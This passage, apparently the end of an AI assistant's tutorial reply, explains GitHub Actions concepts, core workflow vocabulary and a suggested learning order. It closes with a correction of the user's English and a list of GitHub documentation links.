Because jobs are separate execution environments.

### Different workflows

Usually use things such as:

```text
reusable workflow inputs/outputs
artifacts
repository state
external storage
API
```

Memorize the boundary.

---

# 74. The four things people constantly confuse

## Action vs Workflow

```text
Action
  =
small reusable automation component

Workflow
  =
complete automation pipeline
```

## Job vs Step

```text
Job
  =
execution unit / machine boundary

Step
  =
command/action inside that job
```

## Cache vs Artifact

```text
Cache
  =
performance optimization

Artifact
  =
workflow result/data
```

## Variable vs Secret

```text
Variable
  =
normal configuration

Secret
  =
sensitive configuration
```

If those four distinctions are clear, GitHub Actions becomes much easier.

---

# 75. What you should memorize

You do **not** need to memorize hundreds of GitHub keywords.

Memorize this:

```text
on
    = WHEN?

jobs
    = WHAT major work?

runs-on
    = WHERE?

steps
    = HOW?

run
    = execute command

uses
    = reuse automation

with
    = inputs/arguments

env
    = environment variables

if
    = condition

needs
    = dependency

strategy.matrix
    = repeat job using combinations

permissions
    = token privileges

secrets
    = sensitive values

vars
    = configuration

outputs
    = return values

artifacts
    = files/results between jobs or after run

cache
    = performance

environment
    = deployment environment/protection

concurrency
    = control simultaneous execution

workflow_call
    = reusable workflow

GITHUB_TOKEN
    = GitHub-provided workflow credential

OIDC
    = obtain short-lived external credentials
```

That is your core vocabulary.

---

# 76. The one diagram I want you to remember

```text
GitHub event
     │
     ↓
┌──────────────────────────────┐
│           WORKFLOW           │
│                              │
│   ┌────────── JOB ─────────┐ │
│   │ Runner / VM            │ │
│   │                        │ │
│   │ Step 1: uses action    │ │
│   │       ↓                │ │
│   │ Step 2: run command    │ │
│   │       ↓                │ │
│   │ Step 3: run command    │ │
│   └────────────────────────┘ │
│              │               │
│            needs             │
│              ↓               │
│   ┌────────── JOB ─────────┐ │
│   │ another runner         │ │
│   │                        │ │
│   │ Step 1                 │ │
│   │ Step 2                 │ │
│   └────────────────────────┘ │
│                              │
└──────────────────────────────┘
```

Everything else is built around this model.

---

# 77. Your Zero → Hero learning order

Do **not** learn GitHub Actions randomly.

Use this order:

1. **Workflow structure** — `on → jobs → runs-on → steps → run/uses`
2. **Execution model** — jobs parallel, steps sequential, runner boundaries
3. **Triggers** — push, pull_request, workflow_dispatch, schedule
4. **Contexts and expressions** — `${{ }}`, `github`, `env`, `vars`, `secrets`
5. **Job graphs** — `needs`, `if`
6. **Outputs** — step outputs → job outputs → `needs`
7. **Matrix builds**
8. **Artifacts**
9. **Caching**
10. **Containers and services**
11. **Environments and deployments**
12. **Reusable workflows**
13. **Composite/custom actions**
14. **Permissions + GITHUB_TOKEN**
15. **Secrets**
16. **OIDC**
17. **Security boundaries / untrusted PRs**
18. **Concurrency**
19. **Self-hosted runners**
20. **Artifact attestations / supply-chain security**

If you deeply understand those twenty areas, you are no longer a GitHub Actions beginner.

---

# 78. What "hero" actually means

A beginner can write:

```yaml
- run: npm test
```

An intermediate engineer can create:

```text
test
build
docker
deploy
matrix
cache
artifacts
```

A strong senior engineer understands:

```text
DAG design
workflow reuse
runner boundaries
secret boundaries
permission boundaries
concurrency
deployment environments
OIDC federation
cache poisoning
untrusted inputs
supply-chain security
self-hosted runner isolation
```

That is the real difference.

The YAML is the easy part.

The hard part is:

> **execution architecture + security + dependency graph + trust boundaries.**

---

## Your English correction

You wrote:

> “read all github actions docs and then teach me everythings from zero to hero about it”

A natural version is:

> **“Read all the GitHub Actions documentation, then teach me everything about it from zero to hero.”**

Three important corrections:

`github actions` → **GitHub Actions** because it is a proper product name.

`everythings` → **everything**. `Everything` never takes `s`:

```text
everything ✅
everythings ❌
```

And `docs` is perfectly normal informal English, but **documentation** sounds more natural in a formal sentence.

### Official references

The main references I used for this lesson are GitHub's current Actions documentation, concepts, workflow syntax, contexts, triggering, runners, caching/artifacts, reusable workflows, deployment environments, security, `GITHUB_TOKEN`, secrets, OIDC, and artifact attestations. ([GitHub Docs][1])

The best next step is to turn this into **hands-on training**: build one GitHub Actions project from nothing, intentionally break it, inspect the runner/context/output behavior, then gradually evolve it into a real production CI/CD pipeline. That will make the concepts stick much more deeply than reading YAML alone.

[1]: https://docs.github.com/en/actions?utm_source=chatgpt.com "GitHub Actions documentation - GitHub Docs"
[2]: https://docs.github.com/en/actions/get-started/understand-github-actions?utm_source=chatgpt.com "Understanding GitHub Actions - GitHub Docs"
[3]: https://docs.github.com/en/enterprise-server%403.21/actions/reference/workflows-and-actions/workflow-syntax "Workflow syntax for GitHub Actions - GitHub Enterprise Server 3.21 Docs"
[4]: https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/trigger-a-workflow?utm_source=chatgpt.com "Triggering a workflow - GitHub Docs"
[5]: https://docs.github.com/en/actions/how-tos/reuse-automations/reuse-workflows?utm_source=chatgpt.com "Reuse workflows - GitHub Docs"
[6]: https://docs.github.com/en/actions/how-tos/write-workflows/choose-where-workflows-run/choose-the-runner-for-a-job?utm_source=chatgpt.com "Choosing the runner for a job - GitHub Docs"
[7]: https://docs.github.com/en/actions/how-tos/manage-runners/github-hosted-runners/use-github-hosted-runners?utm_source=chatgpt.com "Using GitHub-hosted runners - GitHub Docs"
[8]: https://github.com/actions/checkout/releases?after=v2.0.0&utm_source=chatgpt.com "Releases · actions/checkout · GitHub"
[9]: https://docs.github.com/en/actions/concepts/workflows-and-actions?utm_source=chatgpt.com "Workflows and actions - GitHub Docs"
[10]: https://docs.github.com/en/actions/reference/workflows-and-actions/contexts?utm_source=chatgpt.com "Contexts reference - GitHub Docs"
[11]: https://docs.github.com/en/actions/concepts/security/secrets?utm_source=chatgpt.com "Secrets - GitHub Docs"
[12]: https://docs.github.com/en/actions/concepts/workflows-and-actions/expressions?utm_source=chatgpt.com "Expressions - GitHub Docs"
[13]: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-commands?utm_source=chatgpt.com "Workflow commands for GitHub Actions - GitHub Docs"
[14]: https://docs.github.com/en/actions/concepts/workflows-and-actions/workflow-artifacts?utm_source=chatgpt.com "Workflow artifacts - GitHub Docs"
[15]: https://docs.github.com/en/actions/concepts/workflows-and-actions/dependency-caching?utm_source=chatgpt.com "Dependency caching - GitHub Docs"
[16]: https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching?utm_source=chatgpt.com "Dependency caching reference - GitHub Docs"
[17]: https://docs.github.com/en/actions/how-tos/write-workflows/choose-where-workflows-run/run-jobs-in-a-container?utm_source=chatgpt.com "Running jobs in a container - GitHub Docs"
[18]: https://docs.github.com/en/actions/reference?utm_source=chatgpt.com "Reference for GitHub Actions - GitHub Docs"
[19]: https://docs.github.com/en/actions/reference/workflows-and-actions/deployments-and-environments?utm_source=chatgpt.com "Deployments and environments - GitHub Docs"
[20]: https://docs.github.com/en/actions/concepts/workflows-and-actions/concurrency?utm_source=chatgpt.com "Concurrency - GitHub Docs"
[21]: https://docs.github.com/en/actions/concepts/security/github_token?utm_source=chatgpt.com "GITHUB_TOKEN - GitHub Docs"
[22]: https://docs.github.com/en/actions/reference/security/secure-use?utm_source=chatgpt.com "Secure use reference - GitHub Docs"
[23]: https://docs.github.com/en/actions/concepts/security/openid-connect?utm_source=chatgpt.com "OpenID Connect - GitHub Docs"
[24]: https://docs.github.com/en/actions/reference/security/oidc?utm_source=chatgpt.com "OpenID Connect reference - GitHub Docs"
[25]: https://docs.github.com/en/actions/concepts/security/script-injections?utm_source=chatgpt.com "Script injections - GitHub Docs"
[26]: https://github.com/actions/checkout/blob/main/README.md?utm_source=chatgpt.com "checkout/README.md at main · actions/checkout · GitHub"
[27]: https://docs.github.com/en/actions/concepts/runners/self-hosted-runners?utm_source=chatgpt.com "Self-hosted runners - GitHub Docs"
[28]: https://docs.github.com/en/enterprise-server%403.17/actions/reference/workflows-and-actions/expressions?utm_source=chatgpt.com "Evaluate expressions in workflows and actions - GitHub Enterprise Server 3.17 Docs"
[29]: https://github.com/actions/setup-node?utm_source=chatgpt.com "GitHub - actions/setup-node: Set up your GitHub Actions workflow with a specific version of node.js · GitHub"
[30]: https://docs.github.com/en/actions/concepts/security/artifact-attestations?utm_source=chatgpt.com "Artifact attestations - GitHub Docs"
